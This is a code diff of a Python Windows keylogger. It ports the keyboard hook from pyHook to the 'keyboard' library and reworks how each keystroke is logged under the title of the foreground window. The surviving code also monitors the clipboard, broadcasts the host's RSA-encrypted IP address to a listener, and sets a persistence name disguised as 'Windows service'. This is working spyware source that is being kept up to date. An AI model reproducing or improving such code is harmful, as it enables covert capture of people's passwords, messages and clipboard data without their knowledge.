@@ -3,8 +3,6 @@ from time import sleep
 from tempfile import NamedTemporaryFile
 from utils import *
 from constants import *
-import pyHook
-import pythoncom
 import win32gui
 import win32clipboard
 from sys import argv
@@ -16,7 +14,7 @@ from threading import Thread, Lock
 import ssl
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-from string import printable
+import keyboard
 
 
 def broadcast_myself():
@@ -29,7 +27,8 @@ def broadcast_myself():
         if not connected:
             BDs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
             localIP = gethostbyname(gethostname())
-            BDs.sendto(cipher_rsa.encrypt(localIP.encode("ascii")), ("<broadcast>", BD_PORT))
+            BDs.sendto(cipher_rsa.encrypt(localIP.encode("ascii")),
+                       ("<broadcast>", BD_PORT))
         sleep(BD_INTERVAL)
     BDs.close()
 
@@ -131,23 +130,22 @@ def on_key_down(event):
     global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, DEBUG
     modifiers = get_modifiers()
     curr_win = GetWindowTextW(win32gui.GetForegroundWindow())
-    un_char = ToUnicode(event.KeyID)
+    un_char = ToUnicode(event.scan_code)
+    unsided_name = event.name[event.name.find(" ")+1:]
     if DEBUG:
         print("Modifiers", modifiers)
         print("Unicode:", un_char)
-        print("Virtual Key:", event.KeyID)
-        print("Ascii:", event.Ascii, chr(event.Ascii))
-        print("Description:", event.Key)
+        print("Scan code:", event.scan_code)
+        print("Description:", event.name)
     if curr_win != last_win:
         text_buffer += header(curr_win)
         last_win = curr_win
-    if un_char["code"] == 1 and chr(event.Ascii) in printable[:-5] and not modifiers["ctrl"]:
-        text_buffer += str(un_char["char"])
-    elif event.Key not in BANNED_BUTTONS:
+    if un_char and not modifiers["ctrl"]:
+        text_buffer += un_char
+    elif not is_modifier(unsided_name) and unsided_name not in BANNED_BUTTONS:
         text_buffer += "{%s}" % ("".join(
-            [mod.upper() + "+" for mod in modifiers.keys() if modifiers[mod]]) + event.Key)
+            [mod + "+" for mod in modifiers.keys() if modifiers[mod]]) + unsided_name).upper()
     write_to_file()
-    return True
 
 
 if __name__ == "__main__":
@@ -160,8 +158,7 @@ if __name__ == "__main__":
     STARTUP = False
     STARTUP_NAME = "Windows service"
     CERT_FILE = "cert.pem"
-    BANNED_BUTTONS = ["Apps", "Lshift", "Rshift", "Lmenu",
-                      "Rmenu", "Lcontrol", "Rcontrol", "Capital"]
+    BANNED_BUTTONS = ["menu", "caps lock"]
 
     connected = False
     text_buffer = ""
@@ -180,7 +177,5 @@ if __name__ == "__main__":
     Thread(target=broadcast_myself).start()
     Thread(target=listen).start()
     Thread(target=clipboard_listener).start()
-    hm = pyHook.HookManager()
-    hm.KeyDown = on_key_down
-    hm.HookKeyboard()
-    pythoncom.PumpMessages()
+    keyboard.on_press(on_key_down)
+    keyboard.wait()
